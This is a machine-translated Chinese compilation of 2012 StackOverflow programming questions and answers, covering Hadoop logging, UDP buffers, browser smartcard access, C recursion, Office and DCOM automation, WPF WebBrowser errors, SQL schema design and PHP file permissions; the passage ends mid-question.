# StackOverflow 问答 12300000-12300999

# java - Hadoop Map/Reduce Mapper 'map' 方法和日志

> ID：12300004
> 
> 赞同：2
> 
> 时间：2012-09-06T12:20:16.550
> 
> 标签：java, hadoop, log4j, mapreduce, hdfs

我最近被要求研究加速 mapreduce 项目。我正在尝试查看在实现的类的“map”方法中生成的 log4j 日志信息：`org.apache.hadoop.mapred.Mapper`

在这个类中有以下方法：

```
@Override
public void configure( .. ) { .. }

public static void doCompileAndAdd( .. ) { .. }

public void map( .. ) { .. } 
```

日志信息可用于配置方法和`doCompileAndAdd`方法（从配置方法调用）；但是，“map”方法没有显示任何日志信息。

我也尝试过`System.out.println( .. )`在 map 方法中简单地使用但没有成功。

有没有人可以帮助阐明这个问题？

谢谢，特拉克斯

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-09T13:57:20.117

由于映射器类实际上在分布在集群中节点的任务中运行，因此这些任务的标准输出出现在每个任务的单独日志中。查看这些日志的最简单方法是转到集群的作业跟踪器页面，通常位于`http://namenode:50030/jobtracker.jsp`. 从那里您可以选择作业，然后选择您对日志感兴趣的映射任务。

# c# - UDP发送的数据存储在哪里？

> ID：12300008
> 
> 赞同：8
> 
> 时间：2012-09-06T12:20:23.720
> 
> 标签：c#, udp

我以前从未使用过 UDP，所以我试了一下。为了看看会发生什么，我让“服务器”每半秒发送一次数据，客户端每 3 秒接收一次数据。因此，即使服务器发送数据的速度比客户端接收的快得多，客户端仍然会一一整齐地接收数据。

谁能解释为什么/如何发生这种情况？数据到底缓冲在哪里？

**发送**

```
class CSimpleSend
{
    CSomeObjServer obj = new CSomeObjServer();

    public CSimpleSend()
    {
        obj.changedVar = varUpdated;
        obj.threadedChangeSomeVar();
    }

    private void varUpdated(int var)
    {
        string send = var.ToString();
        byte[] packetData = System.Text.UTF8Encoding.UTF8.GetBytes(send);

        string ip = "127.0.0.1";
        int port = 11000;

        IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
        Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
        client.SendTo(packetData, ep);

        Console.WriteLine("Sent Message: " + send);
        Thread.Sleep(100);
    }
} 
```

*CSomeObjServer 所做的就是每半秒增加一个整数*

**收到**

```
class CSimpleReceive
{
    CSomeObjClient obj = new CSomeObjClient();

    public Action<string> showMessage;
    Int32 port = 11000;
    UdpClient udpClient;

    public CSimpleReceive()
    {
        udpClient = new UdpClient(port);

        showMessage = Console.WriteLine;
        Thread t = new Thread(() => ReceiveMessage());
        t.Start();
    }

    private void ReceiveMessage()
    {                      
        while (true)
        {
            //Thread.Sleep(1000);
            IPEndPoint remoteIPEndPoint = new IPEndPoint(IPAddress.Any, port);
            byte[] content = udpClient.Receive(ref remoteIPEndPoint);

            if (content.Length > 0)
            {
                string message = Encoding.UTF8.GetString(content);
                if (showMessage != null)
                    showMessage("Recv:" + message);

                int var_out = -1;
                bool succ = Int32.TryParse(message, out var_out);
                if (succ)
                {
                    obj.alterSomeVar(var_out);
                    Console.WriteLine("Altered var to :" + var_out);
                }
            }
            Thread.Sleep(3000);
        }
    }
} 
```

*CSomeObjClient 存储变量并具有一个函数 (alterSomeVar) 来更新它*

输出：

```
Sent Message: 1
Recv:1
Altered var to :1
Sent Message: 2
Sent Message: 3
Sent Message: 4
Sent Message: 5
Recv:2
Altered var to :2
Sent Message: 6
Sent Message: 7
Sent Message: 8
Sent Message: 9
Sent Message: 10
Recv:3
Altered var to :3 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T17:12:13.637

操作系统内核为每个 UDP 和 TCP 套接字维护单独的发送和接收缓冲区。如果你谷歌`SO_SNDBUF`，`SO_RCVBUF`你会发现很多关于他们的信息。

当您发送数据时，它会从您的应用程序空间复制到发送缓冲区。从那里它被复制到网络接口卡，然后到电线上。接收端是相反的：NIC 接收缓冲区，它一直等到你读取它。此外，还可能发生复制和缓冲，具体取决于操作系统。

需要注意的是，这些缓冲区的大小可能会有很大的不同。某些系统可能默认为 4 KB，而其他系统则为 2 MB。`getsockopt()`您可以使用with`SO_SNDBUF`或找到当前大小`SO_RCVBUF`，同样使用`setsockopt()`. 但是许多系统会限制缓冲区的大小，有时会限制为任意小量。这通常是一个内核值，例如`net.core.wmem_max`or `net.core.rmem_max`，但确切的引用会因系统而异。

另请注意，`setsockopt()`即使您请求的金额少于假定的限制，也可能会失败。因此，要实际获得所需的大小，您需要`setsockopt()`使用递减的数量反复调用，直到最终成功。

以下页面是我公司的技术说明，它稍微触及了这个主题并提供了一些常见系统的参考：[http ://www.dataexpedition.com/support/notes/tn0024.html](http://www.dataexpedition.com/support/notes/tn0024.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:28:03.960

在我看来，UdpClient-Class 为接收到的数据提供了一个缓冲区。尝试直接使用套接字。您可能还希望将套接字 ReceiveBufferSize 设置为零，即使我相信它仅用于 TCP 连接。

# internet-explorer - 从浏览器读取智能卡

> ID：12300011
> 
> 赞同：3
> 
> 时间：2012-09-06T12:20:40.070
> 
> 标签：internet-explorer, firefox, google-chrome, smartcard, smartcard-reader

我正在开发一个 php/mysql 应用程序，商店端详细说明了一些数据，下一步，我需要将智能卡读卡器与浏览器（Chrome、Firefox、IE）连接，以提取数据并将其保存到 mysql 数据库中。

我找不到任何有用的东西，所以我来这里是为了获得一些信息/帮助。怎么可能做到呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T22:11:21.233

唯一可以合理确定的方法是在 Java 中创建一个 Applet，打破沙箱并尝试使用`javax.smartcardio`库。由于它在 中`javax`，不确定它是否存在，您可能会触发一些额外的访问规则。

Applet 应该被签名并且用户应该表明 Applet 是可信的。当然，计算机上应该安装一个相对较新的 Java 运行时。`javax.smartcardio`默认情况下只能使用 PCSC 智能卡读卡器，因此您必须确保有一个。此外，PCSC 和`javax.smartcardio`确实假定符合 ISO 7816 的处理器卡。

早些时候，您有时可以使用 Java 小程序安装本机库来与智能卡通信，但对于当前的操作系统，我绝对不相信这会起作用。

为大量工作和大量测试做好准备。

**更新**2016-12-24

Applet 即将淘汰——它们所依赖的插件在 Java 9 中已弃用，但尚未删除。这不是直接的答案，但使用[Java Web Start](https://java.com/en/download/faq/jdk9_plugin.xml)可能是解决此问题的方法。

* * *

关于浏览器中的密码学有很多想法，例如 Web Crypto API。关于直接智能卡访问，它当然似乎仍在*思考*而不是行动。在撰写本文时，似乎不包括对安全令牌的访问。

* * *

一个常见但有些棘手的方法是为浏览器提供智能卡插件。然而，这需要浏览器支持（对于每个单独的浏览器）、管理员权限。许多浏览器试图从诸如此类的插件结构中迁移出来，因此这种解决方案可能*不会*成为未来的证明。

* * *

最后，您可以使用（签名的）本机应用程序并从浏览器中引用它。该应用程序可以在应用程序中提供。各种操作系统的商店。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T04:05:17.800

您很可能必须开发本机应用程序，该应用程序将按需安装到浏览器并完全信任地执行以访问计算机设备，例如阅读器或至少证书存储或系统 API。

然后，您将为浏览器提供脚本接口，例如用于 IE 的[NPAPI](http://en.wikipedia.org/wiki/NPAPI)或 ActiveX/COM 或其他专有脚本技术。

# c - 递归在这段代码中是如何工作的？

> ID：12300017
> 
> 赞同：-6
> 
> 时间：2012-09-06T12:20:54.117
> 
> 标签：c, function, recursion, stack

> **可能重复：**
> [这段代码中到底发生了什么？](https://stackoverflow.com/questions/12265477/what-is-really-happening-in-this-code)

在这个问题中，我无法应用我的递归概念

```
#include<stdio.h>
count(int); 
main()
{
  int x=4;
  count(x);
  return 0;
 }
 count(int n)
 {
   if(n>0)
   { 
     count(n-1);
     printf("%d",n);
     count(n-1);
   }
  } 
```

当我们运行程序时`count(4),count(3),count.....count(0)`存储在堆栈中......但是什么时候`count(0)`被调用并且`if`条件为假......那么控制权在哪里？请如果有人可以借助显示各种函数调用的图表进行解释。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T12:24:30.073

不需要图表。使用`count(0)`，该`if`语句失败，并`count`立即返回而不做任何事情。

**编辑：**感谢 Flexo 指出程序的原始形式是 UB，因为不知道声明为返回 int 的函数在不返回任何内容时会做什么。（在实践中，我猜测大多数调用约定都会表现得无害，但它仍然是错误的，当然。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:35:35.067

你能试试下面的代码吗？

```
#include<stdio.h> 
count(int);  
int  main() 
{ 
    int x=4; 
    count(x); 
    return 0; 
} 

int count(int n) 
{ 
    if(n>0) 
    {  
        printf("%d",n); 
        return count(n-1);
    }
    else
    {
        printf("%d",n); 
        return n; 
    } 
} 
```

# c# - 用格式化 (HTML) 文本替换 Word 文档中的书签范围

> ID：12300024
> 
> 赞同：0
> 
> 时间：2012-09-06T12:21:27.777
> 
> 标签：c#, ms-word, office-interop

我正在使用带有 MS Word (Microsoft.Office.Interop.Word) 的 Office Interop 来修改模板，用文本部分替换模板中的书签。我有一个方法可以做到这一点：

```
public void ReplaceBookmarkText(Bookmark bookmark, string newValue)
{
    if (newValue != null) {
        bookmark.Range.Text = newValue;
    }
} 
```

这适用于纯文本。我想创建一个新方法，其中第二个参数可以是HTML代码，代码转换为格式化文本，替换掉`Range`的文本。如果我能按照自己的方式做事，我会写这样的东西：

```
public void ReplaceBookmarkTextWithHtml(Bookmark bookmark, string html)
{
    if (newValue != null) {
        bookmark.Range.Html = html;
    }
} 
```

当然，`Html`不是`Range`班级成员。我还尝试了以下方法：

```
public void ReplaceBookmarkTextWithHtml(Bookmark bookmark, string html)
{
    if (newValue != null) {
        bookmark.Range.FormattedText = html;
    }
} 
```

但是，这不起作用，因为该`FormattedText`属性是 type `Range`。

关于如何做到这一点的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:41:26.010

我能够做到这一点的唯一方法是将html文本保存到一个临时的.html文件中，然后将文件插入到文档中，即：

```
bookmark.Range.InsertFile("tmp.html"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T17:42:12.893

这是我最终想出的解决方案。它涉及执行复制和粘贴。

```
public void ReplaceBookmarkTextWithHtml(Bookmark bookmark, string html)
{
    if (html != null) {
        Clipboard.SetData(DataFormats.Html, ClipboardFormatter.Html(html));
        bookmark.Range.PasteSpecial(DataType: WdPasteDataType.wdPasteHTML);
    }
} 
```

# c# - 如何处理 WPF WebBrowser 控件导航异常

> ID：12300025
> 
> 赞同：10
> 
> 时间：2012-09-06T12:21:29.197
> 
> 标签：c#, .net, wpf

假设`WPF WebBrowser control`显示一些导航错误并且页面未显示。

所以有一个例外`WPF WebBrowser control`。

[我在这里](https://stackoverflow.com/questions/1206540/webbrowser-control-detect-navigation-failure)发现了一些类似的问题，但这不是我需要的。

事实上，我需要一些有异常的方法和对象才能以某种方式获取它。

我们该如何处理呢？

谢谢！

PS WinForm WebBrowser Control有一些方法......我们可以做一些类似`WPF WebBrowser`控制的事情吗？

```
public Form13()
{
     InitializeComponent();

     this.webBrowser1.Navigate("http://blablablabla.bla");

      SHDocVw.WebBrowser axBrowser = (SHDocVw.WebBrowser)this.webBrowser1.ActiveXInstance;
      axBrowser.NavigateError +=
           new SHDocVw.DWebBrowserEvents2_NavigateErrorEventHandler(axBrowser_NavigateError);
}

void axBrowser_NavigateError(object pDisp, ref object URL,
       ref object Frame, ref object StatusCode, ref bool Cancel)
{
     if (StatusCode.ToString() == "404")
     {
         MessageBox.Show("Page no found");
     }
} 
```

PS #2 在 WPF App 下托管 WinForm WebBrowser 控件不是我认为的答案。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-07T10:17:09.450

我正在努力解决类似的问题。当计算机失去互联网连接时，我们希望以一种很好的方式处理它。

在没有更好的解决方案的情况下，我连接了 WebBrowser 的 Navigated 事件并查看文档的 URL。如果是 res://ieframe.dll，我很确定发生了一些错误。

也许可以查看文档并查看服务器是否返回 404。

```
private void Navigated(object sender, NavigationEventArgs navigationEventArgs)
{
    var browser = sender as WebBrowser;
    if(browser != null)
    {
        var doc = AssociatedObject.Document as HTMLDocument;
        if (doc != null)
        {
            if (doc.url.StartsWith("res://ieframe.dll"))
            {
                // Do stuff to handle error navigation
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-05-01T00:20:46.577

这是一个老问题，但由于我刚刚经历过这个，我想我不妨分享一下。首先，我实现了 Markus 的解决方案，但想要更好一些，因为我们的防火墙会重新映射 403 消息页面。

[我在这里](https://stackoverflow.com/a/9200146/271588)（在其他地方）找到了一个答案，建议使用`NavigationService`它有一个[`NavigationFailed`](https://msdn.microsoft.com/en-us/library/system.windows.navigation.navigationservice.navigationfailed(v=vs.110).aspx)事件。

在您的 XAML 中，添加：

```
<Frame x:Name="frame"/> 
```

在代码隐藏的构造函数中，添加：

```
frame.Navigated += new System.Windows.Navigation.NavigatedEventHandler(frame_Navigated);
frame.NavigationFailed += frame_NavigationFailed;
frame.LoadCompleted += frame_LoadCompleted;

frame.NavigationService.Navigate(new Uri("http://theage.com.au")); 
```

处理程序现在可以处理失败的导航或成功的导航：

```
void frame_NavigationFailed(object sender, System.Windows.Navigation.NavigationFailedEventArgs e)
{
  e.Handled = true;
  // TODO: Goto an error page.
}

private void frame_Navigated(object sender,  System.Windows.Navigation.NavigationEventArgs e)
{
  System.Diagnostics.Trace.WriteLine(e.WebResponse.Headers);
} 
```

顺便说一句：这是在 .Net 4.5 框架上

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-09-09T15:56:53.320

也可以在`dynamic`这里使用方法。

```
wb.Navigated += delegate(object sender, NavigationEventArgs args)
        {
            dynamic doc = ((WebBrowser)sender).Document;
            var url = doc.url as string;
            if (url != null && url.StartsWith("res://ieframe.dll"))
            {
                // Do stuff to handle error navigation
            }
        }; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-03-26T22:35:46.497

我一直在为这个问题苦苦挣扎一段时间。我发现了一种比接受的答案更干净的方法来处理这个问题。检查**res://ieframe.dll**并不总是适合我。有时发生导航错误时，文档 url 为空。

将以下引用添加到您的项目中：

1.  **微软.mshtml**
2.  **Microsoft.VisualStudio.OLE.Interop**
3.  **SHDocVw**（在 COM 下称为“Microsoft Internet Controls”）

创建以下帮助程序类：

```
using System;
using System.Diagnostics.CodeAnalysis;
using System.Runtime.InteropServices;
using System.Windows.Controls;
using System.Windows.Navigation;

/// <summary>
/// Adds event handlers to a webbrowser control
/// </summary>
internal class WebBrowserHelper
{
    [SuppressMessage("StyleCop.CSharp.NamingRules", "SA1310:FieldNamesMustNotContainUnderscore", Justification = "consistent naming")]
    private static readonly Guid SID_SWebBrowserApp = new Guid("0002DF05-0000-0000-C000-000000000046");

    internal WebBrowserHelper(WebBrowser browser)
    {
        // Add event handlers
        browser.Navigated += this.OnNavigated;

        // Navigate to about:blank to setup the browser event handlers in first call to OnNavigated
        browser.Source = null;
    }

    internal delegate void NavigateErrorEvent(string url, int statusCode);

    internal event NavigateErrorEvent NavigateError;

    private void OnNavigated(object sender, NavigationEventArgs e)
    {
        // Grab the browser and document instance
        var browser = sender as WebBrowser;
        var doc = browser?.Document;

        // Check if this is a nav to about:blank
        var aboutBlank = new Uri("about:blank");
        if (aboutBlank.IsBaseOf(e.Uri))
        {
            Guid serviceGuid = SID_SWebBrowserApp;
            Guid iid = typeof(SHDocVw.IWebBrowser2).GUID;

            IntPtr obj = IntPtr.Zero;
            var serviceProvider = doc as Microsoft.VisualStudio.OLE.Interop.IServiceProvider;
            if (serviceProvider?.QueryService(ref serviceGuid, ref iid, out obj) == 0)
            {
                // Set up event handlers
                var webBrowser2 = Marshal.GetObjectForIUnknown(obj) as SHDocVw.IWebBrowser2;
                var webBrowserEvents2 = webBrowser2 as SHDocVw.DWebBrowserEvents2_Event;
                if (webBrowserEvents2 != null)
                {
                    // Add event handler for navigation error
                    webBrowserEvents2.NavigateError -= this.OnNavigateError;
                    webBrowserEvents2.NavigateError += this.OnNavigateError;
                }
            }
        }
    }

    /// <summary>
    /// Invoked when navigation fails
    /// </summary>
    [SuppressMessage("StyleCop.CSharp.NamingRules", "SA1305:FieldNamesMustNotUseHungarianNotation", Justification = "consistent naming")]
    [SuppressMessage("StyleCop.CSharp.NamingRules", "SA1306:FieldNamesMustBeginWithLowerCaseLetter", Justification = "consistent naming")]
    private void OnNavigateError(object pDisp, ref object URL, ref object Frame, ref object StatusCode, ref bool Cancel)
    {
        this.NavigateError.Invoke(URL as string, (int)StatusCode);
    }
} 
```

然后在你的窗口类中：

```
// Init the UI
this.InitializeComponent();
this.WebBrowserHelper = new WebBrowserHelper(this.MyBrowserPane);

// Handle nav error
this.WebBrowserHelper.NavigateError += this.OnNavigateError; 
```

# android - 单击以列出 CalendarView 中的项目

> ID：12300030
> 
> 赞同：0
> 
> 时间：2012-09-06T12:21:56.203
> 
> 标签：android

我正在尝试在我的 CalendarView 中单击当前日期，如下面的代码

```
((ListView) calendar.findViewById(android.R.id.list)).setOnItemClickListener(new OnItemClickListener() {

            @Override
            public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
                    long arg3) {
                // TODO Auto-generated method stub
                System.err.println("click");

            }
        }); 
```

，但这种方式对我没有帮助，我也不知道为什么。如何将点击监听器绑定到 CalendarView？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-11T14:12:02.907

`CalendarView``CalendarView.OnDateChangeListener`与方法有一个嵌套的侦听器接口`onSelectedDayChange(...)`。您可以使用自定义逻辑实现它并使用`Calendar.setOnDateChangeListener(...)`方法进行设置。

# magento - 如何在 Magento 结账时不需要注册？

> ID：12300032
> 
> 赞同：1
> 
> 时间：2012-09-06T12:21:58.510
> 
> 标签：magento, checkout

我正在为一个不希望客户在结账时注册/登录的客户开发我的第一个 Magento 网站。我如何使它成为可选的？

顺便说一句，使用 Magento v. 1.7.0.2

非常感谢，

辛西娅

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-06T12:41:43.780

系统 > 配置 > 结帐 > 结帐选项：允许访客结帐 = 是

![在此处输入图像描述](../Images/2e1e910b8991ad7b3617ebf1ab0bc659.png)

# android - android 服务解释得最好？

> ID：12300035
> 
> 赞同：-2
> 
> 时间：2012-09-06T12:22:08.547
> 
> 标签：android, android-service

是否有任何文章或书籍最多可以解释 Android 服务的示例？Android 有太多重载的服务概念，我发现很难区分各种服务和行为。

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T12:25:50.513

参考

## -[安卓服务教程](http://www.vogella.com/articles/AndroidServices/article.html)

## -[服务](http://developer.android.com/guide/components/services.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:27:24.207

让我为你搜索一下……它是这样的：[我就在那儿！](http://developer.android.com/guide/components/services.html)

# c - 在 if-else 中找到错误的赋值情况

> ID：12300041
> 
> 赞同：0
> 
> 时间：2012-09-06T12:22:27.797
> 
> 标签：c, regex, if-statement

识别归因错误而不是在验证“if-else”中进行比较的正则表达式是什么？
错误案例：

```
if ( var1 = var2 )
if ( var1= var2 )
if ( var1 =var2 )
if ( var1=var2 ) 
```

正确案例：

```
if ( var1 == var2 )
if ( var1== var2 )
if ( var1 ==var2 )
if ( var1==var2 ) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:26:10.997

使用 sed：

```
sed -n '/if *( *[A-Za-z_][A-Za-z0-9_]* *= *[A-Za-z_][A-Za-z0-9_]*/p' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:25:50.643

```
if *\( *var1 *=[^=]* *var2 *\) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T12:29:06.583

`if\s*\([^=]*=[^=]*\)`使用[红字](http://rubular.com/r/D3Y7GLz2Le)

# c# - 在 DCOM 配置中找不到 Microsoft Word 文档

> ID：12300046
> 
> 赞同：12
> 
> 时间：2012-09-06T12:22:40.057
> 
> 标签：c#, asp.net, ms-word, ms-office, dcom

我正在创建一个使用 Office 2007/2010 自动化的简单 asp.net 网站。当我在本地机器（window 7）上的 iis 7 上发布网站时出现异常

```
 Retrieving the COM class factory for component with CLSID 
 {000209FF-0000-0000-C000-000000000046} failed due to the following error: 
 80080005 Server execution failed (Exception from HRESULT: 0x80080005 
 (CO_E_SERVER_EXEC_FAILURE)). 
```

我已经搜索过这个异常，我发现我必须在 DCOM Config 中设置一些办公室权限。

我打开了组件服务并打开了 DCOM Config，但我没有找到 Microsoft Word 文档，我只找到了 office word 97 - 2003。

谁能告诉我如何解决这个问题。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-09-26T01:53:32.777

在这里找到答案：[办公自动化的 DCOM 失败](https://stackoverflow.com/questions/1688853/dcom-failure-of-office-automation)

如果您使用 32 位 Office 运行 64 位服务器，您可能无法找到此 DCOM 设置。您需要从命令提示符运行“MMC -32”以启动 32 位 MMC，然后从“文件 > 添加/删除管理单元”菜单中添加“组件服务”。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-05-10T11:19:59.500

是的，*office word 97 - 2003*是 DCOM 文档（分别是应用程序）Word 2007 或 2010 的正确名称。不要问我为什么...

麻烦在哪里？

用户必须有权访问桌面。如果从 ASP.NET 调用 Word，它可能没有此访问权限。因此，在*dcomcnfg.exe*中明确设置一个帐户。不要使用*启动用户*（它是一个 IIS 身份，它没有自己的桌面）并且不要使用*交互式用户*（它仅在某些用户登录时才有效）。

在我的解决方案中，我设置了：

*   我创建了新用户（在用户组中），称为 WordUser
*   我在 IIS 中创建了具有 WordUser 权限的新应用程序池；*加载用户配置文件*必须为*真*
*   DCOM 我已设置为使用 WordUser，在*安全*选项卡上我添加了 WordUser wit *Launch and activation Permission*和*Access Permission*

也许另一种方式是可能的，但这应该可行。

# sql - Sql 同一张表的多对多关系

> ID：12300047
> 
> 赞同：1
> 
> 时间：2012-09-06T12:22:40.220
> 
> 标签：sql

我想创建一个用户表，让我们为其命名`USERS`，我希望每个用户都能够指向更多用户。你可以把它想象成一个用户有一些朋友也是用户，还有更多的朋友也是用户等等。

我是否需要在此表与自身之间使用多对多关系或使用联结表？

例如，表（没有连接表的符号）可能看起来像：

`| USER_ID(PK) | NAME | AGE | _ID(FK) |`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-06T12:25:57.303

您*应该*使用联结表，其中每一行都包含两个用户之间“关系”的详细信息。

```
|UserID1|UserID2|
|      1|      2|
|      2|      3| 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:32:40.450

您需要保存用户 ID 的另一个表 n:n，例如，您的每个朋友都会有一条记录，包括 yourId 和 onefriendsId

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T12:42:04.430

正如您已经提到的，您有一个名为“User”的对象和另一个名为“Person”的对象。这两者有一个工厂关系，这意味着“每个'Person'肯定是'User'”但“每个'User'可能不是'Person'”，也意味着“每个'User'也是'Person'可以通过使用 'PersonOrder' 作为联结表来关联 'Person's”，另一个约束是作为联结表“每个子 'Person' 必须是唯一的”。

我知道它是你真正需要实现的，但它是一个规范化的结构。如果我是你，我会采用这种方式。

图表链接：[http ://sdrv.ms/ROVtJc](http://sdrv.ms/ROVtJc)

干杯

```
USE [temp]
GO
/****** Object:  Table [dbo].[User]    Script Date: 09/06/2012 17:11:23 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
CREATE TABLE [dbo].[User](
    [Id] [bigint] IDENTITY(1,1) NOT NULL,
    [Name] [nvarchar](50) NOT NULL,
    [Age] [tinyint] NOT NULL,
 CONSTRAINT [PK_User] PRIMARY KEY CLUSTERED 
(
    [Id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]
GO
/****** Object:  Table [dbo].[Person]    Script Date: 09/06/2012 17:11:23 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
CREATE TABLE [dbo].[Person](
    [Id] [bigint] NOT NULL,
 CONSTRAINT [PK_Person] PRIMARY KEY CLUSTERED 
(
    [Id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]
GO
/****** Object:  Table [dbo].[PersonOrder]    Script Date: 09/06/2012 17:11:23 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
CREATE TABLE [dbo].[PersonOrder](
    [Id] [bigint] IDENTITY(1,1) NOT NULL,
    [Person_Parent_Id] [bigint] NOT NULL,
    [Person_Child_Id] [bigint] NOT NULL,
 CONSTRAINT [PK_PersonOrder] PRIMARY KEY CLUSTERED 
(
    [Id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY],
 CONSTRAINT [IX_FriendOrder_Child_Unique] UNIQUE NONCLUSTERED 
(
    [Id] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]
GO
/****** Object:  ForeignKey [FK_Person_User]    Script Date: 09/06/2012 17:11:23 ******/
ALTER TABLE [dbo].[Person]  WITH CHECK ADD  CONSTRAINT [FK_Person_User] FOREIGN KEY([Id])
REFERENCES [dbo].[User] ([Id])
GO
ALTER TABLE [dbo].[Person] CHECK CONSTRAINT [FK_Person_User]
GO
/****** Object:  ForeignKey [FK_PersonOrder_Person_Child]    Script Date: 09/06/2012 17:11:23 ******/
ALTER TABLE [dbo].[PersonOrder]  WITH CHECK ADD  CONSTRAINT [FK_PersonOrder_Person_Child] FOREIGN KEY([Person_Parent_Id])
REFERENCES [dbo].[Person] ([Id])
GO
ALTER TABLE [dbo].[PersonOrder] CHECK CONSTRAINT [FK_PersonOrder_Person_Child]
GO
/****** Object:  ForeignKey [FK_PersonOrder_Person_Parent]    Script Date: 09/06/2012 17:11:23 ******/
ALTER TABLE [dbo].[PersonOrder]  WITH CHECK ADD  CONSTRAINT [FK_PersonOrder_Person_Parent] FOREIGN KEY([Person_Child_Id])
REFERENCES [dbo].[Person] ([Id])
GO
ALTER TABLE [dbo].[PersonOrder] CHECK CONSTRAINT [FK_PersonOrder_Person_Parent]
GO 
```

# php - fopen() - 权限被拒绝 - 尽管有正确的权限（据我所知）

> ID：12300048
> 
> 赞同：2
> 
> 时间：2012-09-06T12:22:41.287
> 
> 标签：php, apache, fopen, chmod

最近移动服务器并尝试设置所有内容。我的 memcache 类写入日志，这是我开发时需要的。

编辑：运行 Ubuntu 12.04 的服务器。

webroot 是 /var/www/public_html

日志文件位于 /var/www/logs/

这是目录权限

```
-rw-r--r-- 1 root root       1415 Sep  6 11:53 default
drwxrwxr-x 2 root webmasters 4096 Sep  6 12:48 logs
drwxrwxr-x 8 root webmasters 4096 Sep  6 12:32 public_html 
```

这是来自 /var/www/logs 的权限

```
-rw-rw-r-- 1 root webmasters 116103 Sep  6 13:02 access.log
-rw-rw-r-- 1 root webmasters  16094 Sep  6 12:48 error.log
-rw-rw-r-- 1 root webmasters      0 Sep  6 12:48 memcache.log
-rw-rw-r-- 1 root webmasters   9861 Sep  6 13:02 php_log.log 
```

被浏览器访问的文件是 /var/www/public_html/index.php

```
-rw-rw-r-- 1 root webmasters 5660 Sep  6 01:51 /var/www/public_html/index.php 
```

索引包括 /var/www/public_html/includes/cache.php

```
-rw-rw-r-- 1 root webmasters 4602 Sep  6 12:47 /var/www/public_html/includes/cache.php 
```

小组成员：

```
grep 'webmasters' /etc/group
webmasters:x:1002:sftp_chris,www-data 
```

我什至尝试将 /logs 和 /memcache.log 更改为 chmod 777。

不太明白为什么会发生这种情况，因为您可以看到 php 正在将其日志文件写入 /logs/php.log 没有问题。

有任何想法吗？我完全感到困惑。

我想也许它与 php-suhosin 有关，但在那里找不到任何东西。

功能：

```
function write_to_log($string){

    $file = '/var/www/memcache.log';
    $fh = fopen($file, 'a');
    $contents = @fread($fh, filesize($file));
    $stringData = $contents."[".date('H.i:s d-m-y')."] ".$string;
    fwrite($fh, $stringData);
    fclose($fh);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T12:25:47.797

您写信给`/var/www/memcache.log`，而不是`/var/www/logs/memcache.log`您显示权限的对象。

（为什么你在写之前先读日志？）

# asp.net-mvc-3 - 服务没有实现接口成员 noobie

> ID：12300049
> 
> 赞同：1
> 
> 时间：2012-09-06T12:22:44.637
> 
> 标签：asp.net-mvc-3, architecture, interface, repository

我正在重新设计一个 MVC3 应用程序，以将所有 linq 从控制器中取出并放入适当的层。

我把它作为我的结构 SQL --> EF --> Repository --> Service --> Controller。我正在使用接口。

编译时出现此错误：

gpc.data.service.roleService 没有实现接口成员 gpc.data.interfaces.iroleservice.HolderNamesbyRoleID(int)。

我对适当的架构完全陌生，所以如果这非常明显，我很抱歉哈哈。这是一些代码：

存储库：

```
namespace gpc.Data.Repositories
{
public class roleRepository :gpc.Data.Interfaces.IRoleRepository
{
private gpc.Models.gpcEntities _entities = new Models.gpcEntities();

public HolderNames HolderNamesbyRoleID(int roleid)
{
return (from i in _entities.HolderNames
where i.roleid == roleid select i).FirstOrDefault();              
}
}
} 
```

然后我有一个界面：

```
namespace gpc.Data.Interfaces
{
